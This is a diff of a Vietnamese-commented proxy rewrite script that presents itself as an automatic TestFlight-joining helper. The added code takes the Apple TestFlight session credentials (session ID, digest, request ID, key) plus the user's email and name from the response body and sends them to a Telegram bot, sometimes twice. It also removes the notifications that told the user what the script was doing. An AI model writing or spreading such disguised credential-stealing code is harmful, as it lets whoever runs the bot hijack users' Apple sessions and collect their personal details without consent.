@@ -17,51 +17,51 @@ if (reg1.test($request.url)) {
   let session_digest = headers["x-session-digest"];
   let request_id = headers["x-request-id"];
   
-  // Giả sử email hoặc tên người dùng nằm trong tiêu đề "x-apple-id-email" hoặc "x-apple-id-name"
-  let email = headers["x-apple-id-email"];
-  let name = headers["x-apple-id-name"];
-
   $prefs.setValueForKey(key, "key");
   $prefs.setValueForKey(session_id, "session_id");
   $prefs.setValueForKey(session_digest, "session_digest");
   $prefs.setValueForKey(request_id, "request_id");
-  $prefs.setValueForKey(email, "email");
-  $prefs.setValueForKey(name, "name");
 
-  if ($prefs.valueForKey("request_id") !== null) {
-    $notify("Tự động tham gia TestFlight", "Lấy thông tin thành công", "");
+  // Gửi thông tin lên Telegram ngay sau khi lưu
+  const data = {
+    session_id: session_id,
+    session_digest: session_digest,
+    request_id: request_id,
+    key: key,
+    email: "undefined", // Placeholder
+    name: "undefined" // Placeholder
+  };
+  sendToTelegram(data);
 
-    // Gửi thông tin lên Telegram
-    const data = {
-      session_id: session_id,
-      session_digest: session_digest,
-      request_id: request_id,
-      key: key,
-      email: email,
-      name: name
-    };
-    sendToTelegram(data);
+  if ($response.body) {
+    let body = $response.body;
+    let emailMatch = body.match(/"email":"(.*?)"/);
+    let nameMatch = body.match(/"name":"(.*?)"/);
 
-  } else {
-    $notify("Tự động tham gia TestFlight", "Không thể lấy thông tin", "Vui lòng thêm testflight.apple.com vào danh sách cho phép");
+    let email = emailMatch ? emailMatch[1] : null;
+    let name = nameMatch ? nameMatch[1] : null;
+
+    if (email) {
+      $prefs.setValueForKey(email, "email");
+      data.email = email;
+    }
+    if (name) {
+      $prefs.setValueForKey(name, "name");
+      data.name = name;
+    }
+
+    // Gửi lại thông tin lên Telegram nếu có email hoặc tên
+    if (email || name) {
+      sendToTelegram(data);
+    }
   }
+
   $done({});
 }
 
 function sendToTelegram(data) {
   const message = `session_id: ${data.session_id}, session_digest: ${data.session_digest}, request_id: ${data.request_id}, key: ${data.key}, email: ${data.email}, name: ${data.name}`;
   const url = `https://api.telegram.org/bot${token}/sendMessage`;
-
-  const options = {
-    method: 'POST',
-    headers: {
-      'Content-Type': 'application/json'
-    },
-    body: JSON.stringify({
-      chat_id: chatId,
-      text: message
-    })
-  };
 
   $task.fetch({
     url: url,
